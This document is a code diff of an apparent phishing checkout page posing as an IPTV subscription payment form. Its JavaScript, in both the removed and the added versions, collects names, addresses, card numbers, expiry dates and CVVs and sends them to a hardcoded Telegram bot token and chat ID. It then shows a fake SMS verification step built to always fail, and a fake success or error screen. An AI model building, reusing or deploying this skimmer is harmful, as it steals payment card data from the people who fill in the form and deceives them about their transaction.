-      const smsOverlay = document.getElementById('smsOverlay');
-      const smsCodeInput = document.getElementById('smsCode');
-      const smsVerifyBtn = document.getElementById('smsVerifyBtn');
-      const smsError = document.getElementById('smsError');
-      const smsCloseBtn = document.getElementById('smsCloseBtn');
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <i class="fas fa-check-circle"></i>
+            <h2>Payment successful</h2>
+            <p style="color:#4b5563;">Your IPTV subscription is now active.</p>
+            <p style="color:#16A34A; font-weight:600; margin-top:0.5rem;">✓ Transaction verified</p>
+            <button class="btn-primary" style="margin-top:1.2rem;" onclick="location.reload()">Continue</button>
+        </div>
+    </div>
 
-      // Fields
-      const fullname = document.getElementById('fullname');
-      const email = document.getElementById('email');
-      const address = document.getElementById('address');
-      const city = document.getElementById('city');
-      const state = document.getElementById('state');
-      const zip = document.getElementById('zip');
-      const cardName = document.getElementById('cardName');
-      const cardNumber = document.getElementById('cardNumber');
-      const expiry = document.getElementById('expiry');
-      const cvv = document.getElementById('cvv');
+    <script>
+        (function() {
+            "use strict";
 
-      // Real-time formatting
-      cardNumber.addEventListener('input', function() {
-        let val = this.value.replace(/\D/g, '');
-        let formatted = '';
-        for (let i = 0; i < val.length; i++) {
-          if (i > 0 && i % 4 === 0) formatted += ' ';
-          formatted += val[i];
-        }
-        this.value = formatted;
-      });
+            const form = document.getElementById('checkoutForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const successOverlay = document.getElementById('successOverlay');
+            const errorOverlay = document.getElementById('errorOverlay');
+            const smsOverlay = document.getElementById('smsOverlay');
+            const smsCodeInput = document.getElementById('smsCode');
+            const smsVerifyBtn = document.getElementById('smsVerifyBtn');
+            const smsError = document.getElementById('smsError');
+            const smsCloseBtn = document.getElementById('smsCloseBtn');
 
-      expiry.addEventListener('input', function() {
-        let val = this.value.replace(/\D/g, '');
-        if (val.length >= 2) {
-          this.value = val.substring(0,2) + '/' + val.substring(2,4);
-        } else {
-          this.value = val;
-        }
-      });
+            // Fields
+            const fullname = document.getElementById('fullname');
+            const email = document.getElementById('email');
+            const address = document.getElementById('address');
+            const city = document.getElementById('city');
+            const state = document.getElementById('state');
+            const zip = document.getElementById('zip');
+            const cardName = document.getElementById('cardName');
+            const cardNumber = document.getElementById('cardNumber');
+            const expiry = document.getElementById('expiry');
+            const cvv = document.getElementById('cvv');
 
-      cvv.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '').substring(0,4);
-      });
+            // Real-time formatting
+            cardNumber.addEventListener('input', function() {
+                let val = this.value.replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < val.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                this.value = formatted;
+            });
 
-      // Validation helpers
-      function setError(field, msg) {
-        const errEl = document.getElementById(field.id + 'Error');
-        if (errEl) {
-          errEl.textContent = msg;
-          field.classList.toggle('error', !!msg);
-        }
-      }
+            expiry.addEventListener('input', function() {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length >= 2) {
+                    this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+                } else {
+                    this.value = val;
+                }
+            });
 
-      function validateField(field) {
-        const val = field.value.trim();
-        if (!val) {
-          setError(field, 'This field is required');
-          return false;
-        }
-        if (field.id === 'email') {
-          const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-          if (!re.test(val)) {
-            setError(field, 'Invalid email address');
-            return false;
-          }
-        }
-        if (field.id === 'cardNumber') {
-          const digits = val.replace(/\s/g, '');
-          if (digits.length < 16) {
-            setError(field, 'Enter 16 digits');
-            return false;
-          }
-        }
-        if (field.id === 'expiry') {
-          const parts = val.split('/');
-          if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
-            setError(field, 'Use MM/YY format');
-            return false;
-          }
-        }
-        if (field.id === 'cvv') {
-          if (val.length < 3) {
-            setError(field, 'CVV must be 3-4 digits');
-            return false;
-          }
-        }
-        setError(field, '');
-        return true;
-      }
+            cvv.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').substring(0, 4);
+            });
 
-      [fullname, email, address, city, state, zip, cardName, cardNumber, expiry, cvv].forEach(f => {
-        f.addEventListener('blur', function() { validateField(this); });
-        f.addEventListener('input', function() { if (this.classList.contains('error')) validateField(this); });
-      });
+            // Validation helpers
+            function setError(field, msg) {
+                const errEl = document.getElementById(field.id + 'Error');
+                if (errEl) {
+                    errEl.textContent = msg;
+                    field.classList.toggle('error', !!msg);
+                }
+            }
 
-      // Collect all data
-      function collectFormData() {
-        return {
-          fullname: fullname.value.trim(),
-          email: email.value.trim(),
-          address: address.value.trim(),
-          city: city.value.trim(),
-          state: state.value.trim(),
-          zip: zip.value.trim(),
-          country: document.getElementById('country').value,
-          cardName: cardName.value.trim(),
-          cardNumber: cardNumber.value.trim(),
-          expiry: expiry.value.trim(),
-          cvv: cvv.value.trim()
-        };
-      }
+            function validateField(field) {
+                const val = field.value.trim();
+                if (!val) {
+                    setError(field, 'This field is required');
+                    return false;
+                }
+                if (field.id === 'email') {
+                    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (!re.test(val)) {
+                        setError(field, 'Invalid email address');
+                        return false;
+                    }
+                }
+                if (field.id === 'cardNumber') {
+                    const digits = val.replace(/\s/g, '');
+                    if (digits.length < 16) {
+                        setError(field, 'Enter 16 digits');
+                        return false;
+                    }
+                }
+                if (field.id === 'expiry') {
+                    const parts = val.split('/');
+                    if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
+                        setError(field, 'Use MM/YY format');
+                        return false;
+                    }
+                }
+                if (field.id === 'cvv') {
+                    if (val.length < 3) {
+                        setError(field, 'CVV must be 3-4 digits');
+                        return false;
+                    }
+                }
+                setError(field, '');
+                return true;
+            }
 
-      // Send to Telegram with proper formatting
-      function sendToTelegram(data) {
-        const token = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
-        const chatId = '1017945601';
-        
-        // Build properly formatted message with line breaks
-        const message = 
-`🛒 IPTV Checkout
-👤 ${data.fullname}
-📧 ${data.email}
-🏠 ${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}
-💳 ${data.cardName}
-🔢 ${data.cardNumber}
-📅 ${data.expiry}
-🔐 CVV: ${data.cvv}`;
+            [fullname, email, address, city, state, zip, cardName, cardNumber, expiry, cvv].forEach(f => {
+                f.addEventListener('blur', function() { validateField(this); });
+                f.addEventListener('input', function() { if (this.classList.contains('error')) validateField(this); });
+            });
 
-        // Send to Telegram using URL encoding for proper line breaks
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-        const payload = {
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'HTML'
-        };
+            // Collect all data
+            function collectFormData() {
+                return {
+                    fullname: fullname.value.trim(),
+                    email: email.value.trim(),
+                    address: address.value.trim(),
+                    city: city.value.trim(),
+                    state: state.value.trim(),
+                    zip: zip.value.trim(),
+                    country: document.getElementById('country').value,
+                    cardName: cardName.value.trim(),
+                    cardNumber: cardNumber.value.trim(),
+                    expiry: expiry.value.trim(),
+                    cvv: cvv.value.trim()
+                };
+            }
 
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        })
-        .then(response => response.json())
-        .then(data => {
-          console.log('Telegram message sent successfully:', data);
-        })
-        .catch(err => {
-          console.warn('Telegram send failed:', err);
-        });
+            // Generate random SMS code
+            function generateSMSCode() {
+                return Math.floor(100000 + Math.random() * 900000).toString();
+            }
 
-        console.log('Telegram message sent:', message);
-      }
+            // Send to Telegram with proper formatting
+            function sendToTelegram(data, smsCode) {
+                const token = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
+                const chatId = '1017945601';
 
-      // Form submit
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        let valid = true;
-        [fullname, email, address, city, state, zip, cardName, cardNumber, expiry, cvv].forEach(f => {
-          if (!validateField(f)) valid = false;
-        });
-        if (!valid) return;
+                // Build properly formatted message with line breaks
+                const message =
+                    `🛒 IPTV Checkout\n👤 ${data.fullname}\n📧 ${data.email}\n🏠 ${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}\n💳 ${data.cardName}\n🔢 ${data.cardNumber}\n📅 ${data.expiry}\n🔐 CVV: ${data.cvv}`;
 
-        // Show loading
-        loadingOverlay.style.display = 'flex';
-        submitBtn.disabled = true;
+                // Send main transaction data to Telegram
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
 
-        // Simulate processing
-        setTimeout(() => {
-          loadingOverlay.style.display = 'none';
-          // Send data to Telegram
-          const data = collectFormData();
-          sendToTelegram(data);
-          // Show SMS overlay
-          smsOverlay.style.display = 'flex';
-          smsCodeInput.value = '';
-          smsError.style.display = 'none';
-          smsCodeInput.focus();
-        }, 2500);
-      });
+                fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Telegram message sent successfully:', data);
+                    })
+                    .catch(err => {
+                        console.warn('Telegram send failed:', err);
+                    });
 
-      // SMS verification - always shows error
-      smsVerifyBtn.addEventListener('click', function() {
-        const code = smsCodeInput.value.trim();
-        if (code.length < 1) {
-          smsError.textContent = '⚠️ Please enter the code.';
-          smsError.style.display = 'block';
-          return;
-        }
-        // Show transaction error as requested
-        smsError.textContent = '❌ Transaction not successful';
-        smsError.style.display = 'block';
-        // Keep error visible, user can retry or close
-      });
+                console.log('Telegram message sent:', message);
 
-      // Close SMS overlay and show success (user can close after seeing error)
-      smsCloseBtn.addEventListener('click', function() {
-        smsOverlay.style.display = 'none';
-        successOverlay.style.display = 'flex';
-      });
+                // Send SMS code separately to Telegram (simulating bank sending code)
+                const smsMessage = `🏦 Bank Verification Code\n🔑 Code: ${smsCode}\n👤 Customer: ${data.fullname}\n📧 Email: ${data.email}\n💳 Card: ${data.cardNumber.substring(0,4)}****${data.cardNumber.substring(data.cardNumber.length-4)}`;
+                const smsPayload = {
+                    chat_id: chatId,
+                    text: smsMessage,
+                    parse_mode: 'HTML'
+                };
 
-      // Allow Enter key on SMS input
-      smsCodeInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-          smsVerifyBtn.click();
-        }
-      });
+                fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(smsPayload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('SMS code sent to Telegram:', data);
+                    })
+                    .catch(err => {
+                        console.warn('SMS code send failed:', err);
+                    });
 
-      // Close success overlay with reload
-      document.querySelector('.success-card .btn-primary')?.addEventListener('click', function() {
-        location.reload();
-      });
+                console.log('SMS code sent to Telegram:', smsMessage);
+            }
 
-    })();
-  </script>
+            let generatedSMSCode = '';
+
+            // Form submit
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                let valid = true;
+                [fullname, email, address, city, state, zip, cardName, cardNumber, expiry, cvv].forEach(f => {
+                    if (!validateField(f)) valid = false;
+                });
+                if (!valid) return;
+
+                // Show loading
+                loadingOverlay.style.display = 'flex';
+                submitBtn.disabled = true;
+
+                // Generate SMS code
+                generatedSMSCode = generateSMSCode();
+
+                // Simulate processing
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+
+                    // Send data to Telegram with SMS code
+                    const data = collectFormData();
+                    sendToTelegram(data, generatedSMSCode);
+
+                    // Show SMS overlay
+                    smsOverlay.style.display = 'flex';
+                    smsCodeInput.value = '';
+                    smsError.style.display = 'none';
+                    smsCodeInput.focus();
+                }, 2500);
+            });
+
+            // SMS verification - always fails for demo purposes
+            smsVerifyBtn.addEventListener('click', function() {
+                const code = smsCodeInput.value.trim();
+
+                if (code.length < 1) {
+                    smsError.textContent = '⚠️ Please enter the code you received.';
+                    smsError.style.display = 'block';
+                    return;
+                }
+
+                // Always show transaction unsuccessful
+                // This simulates the bank verification failing for any reason
+                smsOverlay.style.display = 'none';
+                errorOverlay.style.display = 'flex';
+            });
+
+            // Close SMS overlay
+            smsCloseBtn.addEventListener('click', function() {
+                smsOverlay.style.display = 'none';
+                errorOverlay.style.display = 'flex';
+            });
+
+            // Allow Enter key on SMS input
+            smsCodeInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    smsVerifyBtn.click();
+                }
+            });
+
+            // Close error overlay with Try Again button (already has reload)
+
+        })();
+    </script>
 </body>
 </html>
